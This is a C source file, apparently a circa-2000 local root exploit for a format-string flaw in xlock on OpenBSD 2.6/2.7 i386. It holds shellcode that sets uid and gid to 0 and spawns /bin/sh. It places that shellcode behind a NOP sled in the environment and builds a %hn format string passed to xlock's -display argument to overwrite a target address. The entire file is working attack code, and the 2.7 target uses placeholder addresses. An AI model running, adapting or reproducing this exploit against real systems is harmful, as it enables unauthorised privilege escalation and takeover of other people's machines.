/*
OpenBSD 2.6/2.7 xlock exploit by noir
noir@gsu.linux.org.tr 
 
tested only on OpenBSD/i386 2.6
 
thanks:
cengiz_turkmen@hotmail.com for support!

greets: caddis <caddis@dissension.net> orginal chpass exploit
 	bind, CronoS, dustdvl, ppl from defcon7, gsu-linux staff
	TESO, ADM, Lam3rz, SSG 
*/


#include <stdio.h>



char bsd_shellcode[] =
"\x31\xc0\x50\x50\xb0\x17\xcd\x80"// setuid(0) 
"\x31\xc0\x50\x50\xb0\xb5\xcd\x80"//setgid(0)
"\xeb\x16\x5e\x31\xc0\x8d\x0e\x89"
"\x4e\x08\x89\x46\x0c\x8d\x4e\x08"
"\x50\x51\x56\x50\xb0\x3b\xcd\x80"
"\xe8\xe5\xff\xff\xff/bin/sh";

struct platform {
    char *name;
    unsigned short count;
    unsigned long dest_addr;
    unsigned long shell_addr;
    char *shellcode;
};

struct platform targets[3] =
{
    { "OpenBSD 2.6 i386       ", 246, 0xdfbfd4a0, 0xdfbfdde0, bsd_shellcode },
    { "OpenBSD 2.7 i386       ", 246, 0xaabbccdd, 0xaabbccdd, bsd_shellcode },
    { NULL, 0, 0, 0, NULL }
};

char jmpcode[129];
char fmt_string[2000];

char *args[] = { "xlock", "-display", fmt_string, NULL };
char *envs[] = { jmpcode, NULL };


int main(int argc, char *argv[])
{
    char *p;
    int x, len = 0;
    struct platform *target;
    unsigned short low, high;
    unsigned long shell_addr[2], dest_addr[2];


    target = &targets[0];

    memset(jmpcode, 0x90, sizeof(jmpcode));
    strcpy(jmpcode + sizeof(jmpcode) - strlen(target->shellcode), target->shellcode);

    shell_addr[0] = (target->shell_addr & 0xffff0000) >> 16;
    shell_addr[1] =  target->shell_addr & 0xffff;

memset(fmt_string, 0x00, sizeof(fmt_string));
 
for (x = 17; x < target->count; x++) {
        strcat(fmt_string, "%8x");
        len += 8;
    }

if (shell_addr[1] > shell_addr[0]) {
        dest_addr[0] = target->dest_addr+2;
        dest_addr[1] = target->dest_addr;
        low  = shell_addr[0] - len;
        high = shell_addr[1] - low - len;
    } else {
        dest_addr[0] = target->dest_addr;
        dest_addr[1] = target->dest_addr+2;
        low  = shell_addr[1] - len;
        high = shell_addr[0] - low - len;
    }

    *(long *)&fmt_string[0] =  0x41;
    *(long *)&fmt_string[1]  = 0x11111111;
    *(long *)&fmt_string[5]  = dest_addr[0];
    *(long *)&fmt_string[9]  = 0x11111111;
    *(long *)&fmt_string[13] = dest_addr[1];


    p = fmt_string + strlen(fmt_string);
    sprintf(p, "%%%dd%%hn%%%dd%%hn", low, high);

    execve("/usr/X11R6/bin/xlock", args, envs);
    perror("execve");
}



